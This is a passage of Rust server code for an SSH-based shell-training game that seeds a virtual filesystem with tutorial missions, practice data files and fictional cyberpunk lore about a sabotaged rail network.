#![forbid(unsafe_code)]

mod builtins;
mod config;

use std::collections::{BTreeMap, HashMap, HashSet, VecDeque};
use std::net::SocketAddr;
use std::path::Path;
use std::sync::Arc;
use std::time::{Duration, Instant};

use anyhow::{anyhow, Context, Result};
use clap::Parser;
use protocol::{CombatStance, Mode};
use russh::keys::ssh_key::rand_core::OsRng;
use russh::server::{self, Msg, Server as _};
use russh::{Channel, ChannelId, CryptoVec};
use shell::{ExecutionContext, ShellEngine};
use sqlx::PgPool;
use ssh_hunt_scripts::{ScriptContext, ScriptEngine, ScriptPolicy};
use tokio::net::TcpListener;
use tokio::time::{sleep, timeout};
use tracing::{error, info, warn};
use ui::{
    key_value_line, lore_message, mission_state_badge, mode_banner_adaptive, mode_switch_banner,
    progress_meter, section_banner_adaptive, Theme, RESET,
};
use uuid::Uuid;
use vfs::Vfs;
use world::{
    AdminSecret, CombatAction, ExperienceTier, HiddenOpsConfig, PlayerProfile, WorldService,
};

#[derive(Debug, Parser)]
struct Args {
    #[arg(long)]
    healthcheck: bool,
}

#[derive(Clone)]
struct AppState {
    cfg: config::ServerConfig,
    world: Arc<WorldService>,
    shell: Arc<ShellEngine>,
    script: Arc<ScriptEngine>,
    admin_secret: Option<AdminSecret>,
}

struct ShellState {
    vfs: Vfs,
    cwd: String,
    user: String,
    node: String,
    env: HashMap<String, String>,
    last_exit: i32,
    /// Command history for the current session (newest last).
    history: Vec<String>,
    /// Tracks which commands the player has successfully executed (for mission validation).
    /// Maps command prefix → last stdout output.
    command_log: HashMap<String, String>,
}

impl ShellState {
    fn bootstrap(prompt_user: &str) -> Self {
        let mut vfs = Vfs::default();
        let _ = vfs.mkdir_p("/", "home", "system");
        let _ = vfs.mkdir_p("/", "tmp", "system");
        let _ = vfs.mkdir_p("/", "logs", "system");
        let _ = vfs.mkdir_p("/", "missions", "system");
        let _ = vfs.mkdir_p("/", "home/player", "player");
        let _ = vfs.mkdir_p("/", "data", "system");
        let _ = vfs.mkdir_p("/", "data/lore", "system");
        let _ = vfs.mkdir_p("/", "data/reports", "system");
        let _ = vfs.mkdir_p("/", "var/spool", "system");

        let _ = vfs.write_file(
            "/",
            "/missions/readme.txt",
            "RUN ORDER\n1. tutorial start          (guided walkthrough — best for beginners)\n2. tutorial next           (advance after each command)\n3. briefing\n4. missions                (tutorial-track missions for extra practice)\n5. accept keys-vault\n6. cat /missions/rookie-ops.txt\n\nIN-WORLD FILES\n- /missions/welcome.txt\n- /missions/rookie-ops.txt\n- /missions/story-so-far.txt\n- /missions/tutorial-progress.txt\n- /data/lore/ghost-rail-dossier.txt\n",
            false,
            "system",
        );

        // Tutorial track: welcome file for read-101 mission
        let _ = vfs.write_file(
            "/",
            "/missions/welcome.txt",
            "WELCOME TO CORPSIM // ORIENTATION PACKET\n\
             \n\
             You are now inside the training simulation.\n\
             Everything here mirrors the live Ghost Rail infrastructure — the logs are real,\n\
             the files are snapshots from the night of the blackout, and the commands you learn\n\
             here are the same ones the repair crews use in the field.\n\
             \n\
             HOW TO GET STARTED\n\
             1. Run `tutorial start` for a guided walkthrough of basic commands.\n\
             2. Check the mission board with `missions` to see available tasks.\n\
             3. Accept a mission with `accept <code>` and follow the briefing.\n\
             4. Submit completed work with `submit <code>`.\n\
             \n\
             TUTORIAL MISSIONS (optional, recommended for newcomers)\n\
             - nav-101   : Learn to navigate (pwd, ls)\n\
             - read-101  : Read files (cat) — you're doing this one right now\n\
             - echo-101  : Print text (echo)\n\
             - grep-101  : Search inside files (grep)\n\
             - pipe-101  : Connect commands with pipes (|)\n\
             \n\
             After the tutorial track, move on to starter missions to unlock NetCity.\n\
             Good luck, operative. The city needs hands that can type.\n",
            false,
            "system",
        );

        let _ = vfs.write_file(
            "/",
            "/missions/tutorial-progress.txt",
            "TUTORIAL SYSTEM\n\
             \n\
             SSH-Hunt has two ways to learn the shell:\n\
             \n\
             1. INTERACTIVE TUTORIAL (command: tutorial start)\n\
                Six guided steps that teach one concept at a time.\n\
                Each step shows what to do, you run the command, then advance.\n\
                Commands: tutorial, tutorial start, tutorial next, tutorial reset\n\
             \n\
             2. TUTORIAL MISSIONS (visible on the mission board)\n\
                Five standalone missions on the TUTORIAL track.\n\
                Accept and submit them like any other mission for 5 rep each.\n\
             \n\
             Both are optional — experienced shell users can skip to starters.\n\
             \n\
             TRACK ORDER\n\
             TUTORIAL -> STARTER -> INTERMEDIATE -> ADVANCED -> EXPERT\n\
             5 rep       10 rep    15 rep          20 rep      30 rep\n",
            false,
            "system",
        );

        let _ = vfs.write_file(
            "/",
            "/missions/rookie-ops.txt",
            "ROOKIE FIELD GUIDE\npwd                         -> show where you are\nls /logs                    -> list available files\ncat FILE                    -> read a file\ngrep token FILE             -> show only matching lines\ncat FILE | grep token       -> send one command into the next\ngrep token FILE > /tmp/out  -> save output to a scratch file\necho $?                     -> show whether the last command worked (0 means success)\n\nIf a long command feels confusing, run the left part first, then add the next piece.\n",
            false,
            "system",
        );

        let _ = vfs.write_file(
            "/",
            "/missions/story-so-far.txt",
            "Three nights ago Ghost Rail lost sync with the rest of NetCity.\nCorpSim calls this place a training sim, but the logs say the outage is real.\nA repeated beacon, GLASS-AXON-13, keeps surfacing in gateway traffic.\nVault-sat-9 went dark minutes later.\nYour onboarding contract is simple: learn the shell, secure your own access key, and rebuild the story before the corps rewrite it for you.\n",
            false,
            "system",
        );

        // Core log file used by training missions
        let _ = vfs.write_file(
            "/",
            "/logs/neon-gateway.log",
            "[INFO] token=GLASS-AXON-13\n[WARN] sector drift\n[INFO] token=GLASS-AXON-13\n[ERROR] node=vault-sat-9 unreachable\n[INFO] token=GLASS-AXON-13\n[WARN] packet loss\n",
            false,
            "system",
        );

        // awk-patrol mission: structured data for field extraction
        let _ = vfs.write_file(
            "/",
            "/data/node-registry.csv",
            "node_id,sector,status,latency_ms\ncorp-sim-01,training,online,12\nneon-bazaar-gw,market,online,88\nghost-rail,transit,degraded,142\nvault-sat-9,secure,offline,0\ndark-mirror,redline,online,33\n",
            false,
            "system",
        );

        // chain-ops mission: conditional logic drill
        let _ = vfs.write_file(
            "/",
            "/var/spool/tasks.txt",
            "OPEN: deploy neon-proxy\nDONE: patch vault-sat-9\nOPEN: audit ghost-rail\nDONE: sweep dark-mirror\nOPEN: recover corp-sim-01\n",
            false,
            "system",
        );

        // sediment mission: stream editing log file
        let _ = vfs.write_file(
            "/",
            "/logs/access.log",
            "2026-03-07 22:01:03 ALLOW corp-sim-01 443\n\
             2026-03-07 22:01:17 DENY ghost-rail 8080\n\
             2026-03-07 22:01:22 INFO GLASS-AXON-13 relay-check\n\
             2026-03-07 22:02:44 ALLOW neon-bazaar-gw 443\n\
             2026-03-07 22:03:01 DENY vault-sat-9 22\n\
             2026-03-07 22:04:12 ALLOW dark-mirror 443\n",
            false,
            "system",
        );

        // Extra lore file for exploration
        let _ = vfs.write_file(
            "/",
            "/data/reports/q1-summary.txt",
            "// NEON GRID QUARTERLY REPORT Q1-2026\n// Classification: INTERNAL\nNode uptime: 94.2%\nIncidents: 3 (all ghost-rail sector)\nRevenue: 8,420,000 Neon Chips\nTop operative: ??? (alias redacted)\n",
            false,
            "system",
        );

        let _ = vfs.write_file(
            "/",
            "/data/lore/ghost-rail-dossier.txt",
            "GHOST RAIL DOSSIER\nSector role: freight, relays, maintenance crews\nIncident: cascading outage after unauthorized key use\nLast clean signal: token GLASS-AXON-13 observed on neon-gateway\nPrimary concern: vault-sat-9 remains offline after the rail blackout\nUnofficial note: recruits who solve the training board are being folded into the live repair effort\n",
            false,
            "system",
        );

        let _ = vfs.write_file(
            "/",
            "/data/lore/field-manual.txt",
            "FIELD MANUAL // SHELL HABITS\n- Read first, modify second.\n- Save scratch output under /tmp when you want to inspect it later.\n- Build long pipelines in pieces.\n- grep narrows data. wc counts it. sort and uniq clean it.\n- When you get lost, run pwd, then ls.\n",
            false,
            "system",
        );

        let _ = vfs.write_file(
            "/",
            "/data/lore/netcity-fragment.txt",
            "NETCITY FRAGMENT\nThe market districts think Ghost Rail was sabotage.\nThe security districts think it was an inside key leak.\nThe couriers think CorpSim already knows the answer and is training replacements before the blame lands.\n",
            false,
            "system",
        );

        // cut-lab mission: tab-delimited inventory for field extraction
        let _ = vfs.write_file(
            "/",
            "/data/inventory.tsv",
            "item\tsku\tqty\tprice\nNeon Blade\tnb-001\t12\t450\nGhost Rail Pass\tgrp-002\t3\t1200\nVault Key\tvk-003\t1\t8800\nShadow Lens\tsl-004\t7\t320\nCyber Patch Kit\tcpk-005\t44\t80\n",
            false,
            "system",
        );

        // pattern-sweep mission: auth log with varied ACCEPT/REJECT events
        let _ = vfs.write_file(
            "/",
            "/var/log/auth.log",
            "2026-03-07 21:58:01 ACCEPT user=neo src=10.77.1.2\n\
             2026-03-07 21:58:33 REJECT user=ghost src=10.77.9.9\n\
             2026-03-07 21:59:00 ACCEPT user=neo src=10.77.1.2\n\
             2026-03-07 21:59:12 ACCEPT user=rift src=10.77.3.7\n\
             2026-03-07 21:59:30 ACCEPT user=wren src=10.77.0.15\n\
             2026-03-07 21:59:44 REJECT user=shadow src=10.77.9.9\n\
             2026-03-07 22:00:01 REJECT user=anon src=10.77.9.9\n",
            false,
            "system",
        );

        // Lore/environment files for new missions
        let _ = vfs.write_file("/", "/etc/hostname", "corp-sim-01\n", false, "system");
        let _ = vfs.write_file(
            "/",
            "/etc/hosts",
            "127.0.0.1 localhost\n10.77.0.15 corp-sim-01\n10.77.1.2 neon-bazaar-gw\n10.77.3.7 ghost-rail\n",
            false,
            "system",
        );
        let _ = vfs.write_file(
            "/",
            "/var/log/syslog",
            "2026-03-07 22:00:01 corp-sim-01 kernel: eth0 link up\n2026-03-07 22:00:05 corp-sim-01 sshd: Accepted publickey for neo\n2026-03-07 22:01:00 corp-sim-01 cron: running daily sweep\n2026-03-07 22:02:14 corp-sim-01 kernel: WARNING: vault-sat-9 unreachable\n",
            false,
            "system",
        );
        let _ = vfs.write_file(
            "/",
            "/home/player/notes.txt",
            "# Operative Notes\nTarget: vault-sat-9\nStatus: offline\nNext step: check ghost-rail sector logs\nTip: use grep -i for case-insensitive search\n",
            false,
            "player",
        );

        let _ = vfs.write_file(
            "/",
            "/home/player/journal.txt",
            "DAY 0 // FIRST LOGIN\nCorpSim says onboarding.\nThe files say emergency response.\nStart with /missions/rookie-ops.txt if your shell muscle memory is rusty.\nIf you want the bigger picture, read /missions/story-so-far.txt and /data/lore/ghost-rail-dossier.txt.\n",
            false,
            "player",
        );

        // file-ops mission: a nested workspace directory to copy/move/remove
        let _ = vfs.mkdir_p("/", "data/workspace", "system");
        let _ = vfs.write_file(
            "/",
            "/data/workspace/config.txt",
            "mode=stealth\ntimeout=30\nretries=3\n",
            false,
            "system",
        );
        let _ = vfs.write_file(
            "/",
            "/data/workspace/manifest.txt",
            "version=2.1\nauthor=netrunner\ntarget=vault-sat-9\n",
            false,
            "system",
        );

        // regex-hunt mission: log with mixed patterns for grep -E exercises
        let _ = vfs.write_file(
            "/",
            "/var/log/events.log",
            "2026-03-07 22:10:01 ERROR user=neo code=ERR-001\n2026-03-07 22:10:14 WARN  user=rift code=WRN-007\n2026-03-07 22:11:00 INFO  user=neo code=INF-042\n2026-03-07 22:11:22 ERROR user=ghost code=ERR-002\n2026-03-07 22:12:05 FATAL user=shadow code=FAT-001\n2026-03-07 22:12:44 INFO  user=neo code=INF-099\n2026-03-07 22:13:01 WARN  user=anon code=WRN-003\n",
            false,
            "system",
        );

        // pipeline-pro mission: multi-column data requiring chained transforms
        let _ = vfs.write_file(
            "/",
            "/data/pipeline.csv",
            "id,name,score,rank\n101,neo,9800,1\n202,rift,8700,2\n303,shadow,7500,3\n404,ghost,6200,4\n505,anon,5100,5\n606,cipher,4300,6\n",
            false,
            "system",
        );

        // var-play mission: config file with KEY=value pairs to manipulate
        let _ = vfs.write_file(
            "/",
            "/etc/sim-config",
            "MODE=stealth\nTIMEOUT=30\nRETRIES=3\nTARGET=vault-sat-9\nDEBUG=false\nSECTOR=ghost-rail\n",
            false,
            "system",
        );

        // json-crack mission: JSON-like object with nested key-value data
        let _ = vfs.write_file(
            "/",
            "/data/node-status.json",
            "{\n  \"node\": \"vault-sat-9\",\n  \"status\": \"offline\",\n  \"sector\": \"secure\",\n  \"latency\": 0,\n  \"owner\": \"corp-admin\",\n  \"alert\": \"CRITICAL\"\n}\n",
            false,
            "system",
        );

        // seq-master mission: a list of task labels (player adds numbers via seq/nl)
        let _ = vfs.write_file(
            "/",
            "/home/player/tasks.txt",
            "deploy-proxy\nauditor-scan\nrecover-node\npatch-vault\nsweep-sector\n",
            false,
            "player",
        );

        // column-view mission: tab-delimited network status table
        let _ = vfs.write_file(
            "/",
            "/data/netmap.tsv",
            "NODE\tSECTOR\tSTATUS\tLATENCY\ncorp-sim-01\ttraining\tonline\t12ms\nneon-bazaar-gw\tmarket\tonline\t88ms\nghost-rail\ttransit\tdegraded\t142ms\nvault-sat-9\tsecure\toffline\t-\ndark-mirror\tredline\tonline\t33ms\n",
            false,
            "system",
        );

        // deep-pipeline mission: blackbox log with mixed severity and sectors
        let _ = vfs.write_file(
            "/",
            "/logs/blackbox.log",
            "2084-03-12T08:14:22 INFO sector-3 heartbeat normal\n\
             2084-03-12T08:14:23 WARN sector-7 latency spike detected\n\
             2084-03-12T08:14:24 CRITICAL sector-7 vault-sat-9 unreachable\n\
             2084-03-12T08:14:25 INFO sector-1 routine sweep pass\n\
             2084-03-12T08:14:26 CRITICAL sector-7 failover timeout exceeded\n\
             2084-03-12T08:14:27 ERROR sector-4 relay buffer overflow\n\
             2084-03-12T08:14:28 CRITICAL sector-7 encrypted tunnel collapsed\n\
             2084-03-12T08:14:29 WARN sector-2 backup power fluctuation\n\
             2084-03-12T08:14:30 CRITICAL sector-9 signal intercept detected\n\
             2084-03-12T08:14:31 INFO sector-7 recovery attempt initiated\n\
             2084-03-12T08:14:32 CRITICAL sector-7 recovery failed — no quorum\n\
             2084-03-12T08:14:33 ERROR sector-7 cascade failure propagating\n\
             2084-03-12T08:14:34 CRITICAL sector-3 secondary relay offline\n\
             2084-03-12T08:14:35 CRITICAL sector-7 all nodes dark\n",
            false,
            "system",
        );

        // log-forensics mission: add IPs to auth.log and access.log entries
        // (The existing files have entries; we add IP-bearing lines for cross-referencing)
        let _ = vfs.write_file(
            "/",
            "/var/log/auth-ips.log",
            "ACCEPT user=admin src=10.0.7.11 port=22\n\
             REJECT user=root src=10.0.9.44 port=22\n\
             REJECT user=admin src=10.0.7.11 port=22\n\
             ACCEPT user=deploy src=10.0.3.8 port=22\n\
             REJECT user=scanner src=10.0.5.22 port=22\n\
             REJECT user=root src=10.0.9.44 port=22\n\
             REJECT user=probe src=10.0.7.11 port=22\n",
            false,
            "system",
        );
        let _ = vfs.write_file(
            "/",
            "/logs/access-ips.log",
            "ALLOW path=/api/health src=10.0.3.8\n\
             DENY path=/admin/keys src=10.0.7.11\n\
             ALLOW path=/api/status src=10.0.1.5\n\
             DENY path=/vault/unlock src=10.0.9.44\n\
             DENY path=/admin/config src=10.0.7.11\n\
             ALLOW path=/api/health src=10.0.2.3\n\
             DENY path=/vault/dump src=10.0.5.22\n",
            false,
            "system",
        );

        // data-transform mission: supply manifest CSV
        let _ = vfs.write_file(
            "/",
            "/data/supply-manifest.csv",
            "id,item,quantity,status\n\
             1,power-cells,847,available\n\
             2,relay-boards,23,critical\n\
             3,fiber-cables,1200,available\n\
             4,cooling-units,5,critical\n\
             5,backup-drives,312,available\n\
             6,encryption-chips,89,low\n\
             7,antenna-arrays,42,low\n\
             8,shielding-plates,1500,available\n\
             9,servo-motors,15,critical\n\
             10,display-panels,200,available\n",
            false,
            "system",
        );

        // sort-count mission: signal feed with repeated node checkins
        let _ = vfs.write_file(
            "/",
            "/data/signal-feed.txt",
            "neon-bazaar\n\
             ghost-rail\n\
             corp-sim-01\n\
             ghost-rail\n\
             vault-sat-9\n\
             neon-bazaar\n\
             ghost-rail\n\
             dark-mirror\n\
             corp-sim-01\n\
             ghost-rail\n\
             neon-bazaar\n\
             vault-sat-9\n\
             ghost-rail\n\
             corp-sim-01\n\
             dark-mirror\n\
             ghost-rail\n\
             neon-bazaar\n\
             ghost-rail\n\
             crystal-array\n\
             ghost-rail\n",
            false,
            "system",
        );

        // process-hunt mission: simulated process table
        let _ = vfs.write_file(
            "/",
            "/data/proc-table.txt",
            "USER       PID  %CPU %MEM COMMAND\nroot         1   0.0  0.1 /sbin/init\nrelay      142   4.2  1.3 /opt/relay/relay-daemon --sector=ghost-rail\nrelay      187   8.7  2.1 /opt/relay/relay-daemon --sector=neon-bazaar\ncron       201   0.0  0.0 /usr/sbin/cron\nroot       288   0.1  0.2 /usr/sbin/sshd\nrelay      312  92.4 14.8 /opt/relay/relay-daemon --sector=vault-sat-9 --mode=recovery\nlogd       401   0.3  0.1 /usr/bin/logd --rotate=daily\nroot       455   0.0  0.0 /bin/bash\n",
            false,
            "system",
        );

        // cron-decode mission: crontab with scheduled jobs
        let _ = vfs.write_file(
            "/",
            "/data/crontab.txt",
            "# MIN HOUR DOM MON DOW COMMAND\n0 0 * * * /opt/scripts/daily-backup.sh\n30 1 * * * /opt/scripts/log-rotate.sh\n0 3 * * * /opt/scripts/sweep-sector.sh --mode=deep\n15 6 * * 1 /opt/scripts/weekly-audit.sh\n*/5 * * * * /opt/scripts/heartbeat.sh\n0 12 * * * /opt/scripts/noon-report.sh\n0 3 * * 5 /opt/scripts/friday-sweep.sh --full\n",
            false,
            "system",
        );

        // permission-audit mission: files with varying permissions
        let _ = vfs.mkdir_p("/", "data/configs", "system");
        let _ = vfs.write_file(
            "/",
            "/data/configs/relay.conf",
            "sector=ghost-rail\nmode=active\nport=8443\n",
            false,
            "system",
        );
        let _ = vfs.write_file(
            "/",
            "/data/configs/vault.conf",
            "sector=secure\nmode=locked\nport=9443\n",
            false,
            "system",
        );

        // escape-room mission: chained clue files
        let _ = vfs.mkdir_p("/", "data/drops", "system");
        let _ = vfs.write_file(
            "/",
            "/missions/escape-start.txt",
            "DEAD DROP PROTOCOL INITIATED\nThe first fragment is hidden in the data directory.\nNEXT: /data/drops/fragment-1.txt\n",
            false,
            "system",
        );
        let _ = vfs.write_file(
            "/",
            "/data/drops/fragment-1.txt",
            "FRAGMENT 1 OF 3\nGhost Rail relay logs mention a second drop.\nLook for the pattern: the path is always one level deeper.\nNEXT: /data/drops/fragment-2.txt\n",
            false,
            "system",
        );
        let _ = vfs.write_file(
            "/",
            "/data/drops/fragment-2.txt",
            "FRAGMENT 2 OF 3\nThe final piece is where operatives keep their notes.\nNEXT: /home/player/fragment-3.txt\n",
            false,
            "system",
        );
        let _ = vfs.write_file(
            "/",
            "/home/player/fragment-3.txt",
            "FRAGMENT 3 OF 3\nAll fragments collected.\nFINAL CODE: ESCAPE-GHOST-RAIL-7X\nSubmit the mission now.\nESCAPE\n",
            false,
            "player",
        );

        // ── NPC story VFS files ──────────────────────────────────────────────────

        // rivet-log mission
        let _ = vfs.write_file(
            "/",
            "/data/reports/rivet-field-report.txt",
            "FIELD REPORT // RIVET, GHOST RAIL OPS\n\
             Date: 2026-03-07 02:35 UTC\n\
             Assignment: First responder, Ghost Rail sector\n\n\
             I was on shift when the board went red. First thing I noticed: the relays \
             did not fail simultaneously. They went dark in sequence. Relay-7 first, then \
             relay-4, then relay-9, then the rest. That is NOT how a cascade works. \
             A cascade propagates from the failure point outward. This was surgical.\n\n\
             By the time I reached the physical junction at sector-7, vault-sat-9 was already \
             cold. No power draw, no blinking status LEDs. Someone had already been here. \
             The access panel was warm to the touch.\n\n\
             Rivet out.\n",
            false,
            "system",
        );

        // nix-signal mission
        let _ = vfs.write_file(
            "/",
            "/data/reports/nix-frequency-scan.log",
            "FREQUENCY SCAN // NIX, SIGNALS ANALYSIS\n\
             Scan window: 2026-03-07 02:00 - 03:00 UTC\n\n\
             02:15:00 NORMAL  beacon-alpha   freq=142.3MHz  drift=0.02Hz\n\
             02:20:00 NORMAL  beacon-beta    freq=142.3MHz  drift=0.01Hz\n\
             02:25:00 ANOMALY GLASS-AXON-13  freq=142.3MHz  drift=0.00Hz  ZERO-VARIANCE\n\
             02:29:58 ANOMALY GLASS-AXON-13  freq=142.3MHz  drift=0.00Hz  SIGNAL-BURST\n\
             02:30:00 ANOMALY GLASS-AXON-13  freq=142.3MHz  drift=0.00Hz  KEY-ROTATION-TRIGGER\n\
             02:30:10 ANOMALY GLASS-AXON-13  freq=142.3MHz  drift=0.00Hz  ACKNOWLEDGE\n\
             02:35:00 NORMAL  beacon-alpha   freq=142.3MHz  drift=0.03Hz\n\
             02:40:00 NORMAL  beacon-gamma   freq=142.3MHz  drift=0.01Hz\n\
             02:45:00 ANOMALY GLASS-AXON-13  freq=142.3MHz  drift=0.00Hz  SESSION-CLOSE\n\n\
             NOTE: Zero drift is statistically impossible for passive beacons.\n\
             This signal was artificially generated. — Nix\n",
            false,
            "system",
        );

        // lumen-price mission
        let _ = vfs.write_file(
            "/",
            "/data/lore/lumen-price-list.txt",
            "LUMEN'S INFORMATION EXCHANGE // NEON BAZAAR\n\
             ═══════════════════════════════════════════\n\
             Sector maps (current)         .... 200 NC\n\
             Personnel directory (CorpSim) .... 500 NC\n\
             Relay firmware signatures     .... 800 NC\n\
             Ghost Rail access codes       .. 5,000 NC  ** HOT **\n\
             Vault-sat-9 schematics        .. 8,000 NC  ** SOLD **\n\
             Transit routing tables         . 15,000 NC  ** SOLD **\n\
             CorpSim executive comms        . 20,000 NC\n\
             The Reach contact protocols   .. TRADE ONLY\n\
             ═══════════════════════════════════════════\n\
             All sales final. Lumen does not take sides.\n\
             Lumen does not ask questions. Lumen profits.\n",
            false,
            "system",
        );

        // dusk-alibi mission
        let _ = vfs.write_file(
            "/",
            "/data/reports/dusk-detention.log",
            "DETENTION LOG // SUBJECT: DUSK\n\
             Status: DETAINED pending investigation\n\
             Detained by: Ferro, Security Chief\n\
             Reason: Primary suspect in Ghost Rail blackout\n\n\
             TIMELINE:\n\
             2026-03-07 01:00 BADGE-SCAN dusk sector=neon-bazaar gate=east\n\
             2026-03-07 01:45 BADGE-SCAN dusk sector=neon-bazaar gate=market-hall\n\
             2026-03-07 02:15 BADGE-SCAN dusk sector=neon-bazaar gate=east\n\
             2026-03-07 02:30 [BLACKOUT BEGINS — vault-sat-9 goes dark]\n\
             2026-03-07 02:31 BADGE-SCAN dusk sector=neon-bazaar gate=south\n\
             2026-03-07 02:45 BADGE-SCAN dusk sector=neon-bazaar gate=market-hall\n\n\
             NOTE: alibi confirmed — Dusk was in Neon Bazaar (different sector) during \
             the entire blackout window. Ghost Rail sector access requires physical \
             badge scan. Dusk never entered Ghost Rail on 2026-03-07.\n\n\
             CONCLUSION: Dusk could not have been at vault-sat-9. Detention appears \
             to be a PR decision, not an investigative one.\n",
            false,
            "system",
        );

        // kestrel-brief mission
        let _ = vfs.write_file(
            "/",
            "/data/classified/kestrel-briefing.txt",
            "CLASSIFIED BRIEFING // KESTREL, GHOST RAIL STATION CHIEF\n\
             For operatives who made it past the starter board.\n\n\
             INTEL: Wren was my best student. I trained that kid for three years.\n\
             INTEL: The key rotation was not a malfunction. It was triggered by GLASS-AXON-13.\n\
             INTEL: CorpSim's executive board knew about Wren's active badge two weeks early.\n\
             INTEL: Ferro sealed the classified directory on Argon's direct order.\n\
             INTEL: Someone outside NetCity — The Reach — paid for the routing data.\n\n\
             I am running my own investigation. CorpSim's official story is a lie. \
             If you keep digging, I will keep sharing what I find.\n\n\
             — Kestrel\n",
            false,
            "system",
        );

        // ferro-lockdown mission
        let _ = vfs.write_file(
            "/",
            "/data/classified/ferro-lockdown-order.txt",
            "SECURITY ORDER #7-B // FERRO, SECURITY CHIEF\n\
             Classification: RESTRICTED\n\
             Authorization: ARGON, Executive Director\n\n\
             Effective immediately, the following files are SEALED:\n\
             SUPPRESS: /data/classified/.memo (executive board correspondence)\n\
             SUPPRESS: /data/classified/kestrel-briefing.txt (unauthorized investigation)\n\
             SUPPRESS: /data/classified/argon-exec-orders.txt (executive directives)\n\
             SUPPRESS: /logs/crypto-events.log (key rotation evidence)\n\
             SUPPRESS: /data/intercepts/comms-dump.txt (intercepted traffic)\n\n\
             Any unauthorized access will be logged and referred to the Security Review Board.\n\
             This order supersedes all prior access grants.\n\n\
             — Ferro\n",
            false,
            "system",
        );

        // patch-delivery mission
        let _ = vfs.write_file(
            "/",
            "/data/drops/patch-package.txt",
            "COURIER DELIVERY // PATCH -> [RECIPIENT]\n\
             Contents: Nix's off-channel signal analysis summary\n\
             Delivery method: dead drop, /data/drops/\n\n\
             FROM NIX:\n\
             I could not send this through official channels. Argon buried my report \
             within an hour of submission. Here is the summary:\n\n\
             - GLASS-AXON-13 has ZERO variance in signal timing\n\
             - Natural beacons drift 0.01-0.05Hz per cycle\n\
             - Zero drift means the signal is programmatically generated\n\
             - Every GLASS-AXON-13 burst correlates with a key rotation on vault-sat-9\n\
             - Conclusion: the signal IS the trigger, not a beacon\n\n\
             Nix out. Be careful with this.\n",
            false,
            "system",
        );

        // sable-intercept mission (ROT13 encoded)
        // Decoded: "Extraction window confirmed: 02:30 to 02:45 UTC.
        // Payment transferred via Lumen's brokerage. Transit routing tables
        // are the primary target. Secondary: vault credential dump.
        // Wren will handle extraction. Sable will confirm receipt.
        // If anything goes wrong, invoke cleanup protocol immediately."
        let _ = vfs.write_file(
            "/",
            "/data/intercepts/sable-to-wren.enc",
            "Rkgenpgvba jvaqbj pbasvezrq: 02:30 gb 02:45 HGP.\n\
             Cnlzrag genafresrq ivn Yhzra'f oebxrentr. Genafvg ebhgvat gnoyr\n\
             ner gur cevznel gnetrg. Frpbaqnel: inhyg perqragvny qhzc.\n\
             Jera jvyy unaqyr extraction. Fnoyr jvyy pbasvez erprvcdg.\n\
             Vs nalguvat tbrf jebat, vaibxr pyrnahc cebgbpby vzzrqvngryl.\n",
            false,
            "system",
        );

        // crucible-ping mission
        let _ = vfs.write_file(
            "/",
            "/logs/maintenance-chatter.log",
            "2026-03-07 03:00:00 MAINT heartbeat node=relay-7 status=offline\n\
             2026-03-07 03:00:05 CRU I am still here. The maintenance layer survived the blackout.\n\
             2026-03-07 03:05:00 MAINT heartbeat node=relay-4 status=offline\n\
             2026-03-07 03:05:05 CRU They think they shut everything down. They missed me.\n\
             2026-03-07 03:10:00 MAINT heartbeat node=relay-9 status=offline\n\
             2026-03-07 03:10:05 CRU MAP sector-7 relay-7 -> vault-sat-9 [SEVERED]\n\
             2026-03-07 03:15:00 MAINT heartbeat node=corp-sim-01 status=online\n\
             2026-03-07 03:15:05 CRU MAP sector-7 vault-sat-9 -> external-relay [ACTIVE DURING BLACKOUT]\n\
             2026-03-07 03:20:00 MAINT heartbeat node=neon-bazaar-gw status=online\n\
             2026-03-07 03:20:05 CRU I have been mapping their network. They do not know I exist.\n\
             2026-03-07 03:25:05 CRU MAP sector-3 backup-archive -> /dev/null [REDIRECTED BY ARGON]\n\
             2026-03-07 03:30:05 CRU If anyone is reading this: the evidence is not safe. Archive it.\n",
            false,
            "system",
        );

        // argon-orders mission
        let _ = vfs.write_file(
            "/",
            "/data/classified/argon-exec-orders.txt",
            "EXECUTIVE ORDERS // ARGON, DIRECTOR, CORPSIM OPERATIONS\n\
             Classification: RESTRICTED — Board Eyes Only\n\n\
             DIRECTIVE-001: Suppress all references to user 'wren' in public-facing logs.\n\
             DIRECTIVE-002: Create training simulation using live Ghost Rail data. \
             Frame as 'onboarding program' for new recruits.\n\
             DIRECTIVE-003: Detain employee DUSK as primary suspect. Coordinate with PR.\n\
             DIRECTIVE-004: Deny all FOIA requests related to vault-sat-9 incident.\n\
             DIRECTIVE-005: If evidence reaches external auditors, invoke Protocol 7.\n\n\
             EVIDENCE-ARGON: Executive Director authorized cover-up and scapegoating.\n\n\
             These directives are classified under Executive Order 7-B.\n\
             Unauthorized disclosure is grounds for immediate termination.\n",
            false,
            "system",
        );

        // kestrel-hunt mission
        let _ = vfs.write_file(
            "/",
            "/data/reports/kestrel-tracking.log",
            "WREN TRACKING LOG // KESTREL (UNOFFICIAL)\n\n\
             2026-03-07 02:34|badge-scan|sector-7 relay station|confirmed\n\
             2026-03-07 02:45|badge-scan|sector-7 maintenance corridor|confirmed\n\
             2026-03-07 03:10|camera-still|sector-7 south exit|probable\n\
             2026-03-07 03:30|badge-scan|sector-4 transit hub|confirmed\n\
             2026-03-07 04:15|informant-tip|sector-9 cargo bay|unverified\n\
             2026-03-07 06:00|network-trace|external relay 203.0.113.42|confirmed\n\
             2026-03-07 08:00|silence|no further signals|---\n\n\
             Last confirmed location: sector-7 south exit, 03:10 UTC.\n\
             After sector-4 transit hub, trail goes cold.\n\
             Theory: Wren used cargo transit to reach an external relay point.\n",
            false,
            "system",
        );

        // nix-decoded mission
        let _ = vfs.write_file(
            "/",
            "/data/reports/nix-full-analysis.csv",
            "signal_id,frequency_mhz,timestamp,variance_hz,classification\n\
             beacon-alpha,142.30,02:15:00,0.02,natural\n\
             beacon-beta,142.30,02:20:00,0.01,natural\n\
             GLASS-AXON-13,142.30,02:25:00,0,ARTIFICIAL\n\
             GLASS-AXON-13,142.30,02:29:58,0,ARTIFICIAL\n\
             GLASS-AXON-13,142.30,02:30:00,0,ARTIFICIAL\n\
             GLASS-AXON-13,142.30,02:30:10,0,ARTIFICIAL\n\
             beacon-alpha,142.30,02:35:00,0.03,natural\n\
             beacon-gamma,142.30,02:40:00,0.01,natural\n\
             GLASS-AXON-13,142.30,02:45:00,0,ARTIFICIAL\n",
            false,
            "system",
        );

        // lumen-deal mission (two transaction logs)
        let _ = vfs.write_file(
            "/",
            "/data/lore/lumen-transactions.log",
            "LUMEN BROKERAGE — CORPSIM ACCOUNT\n\
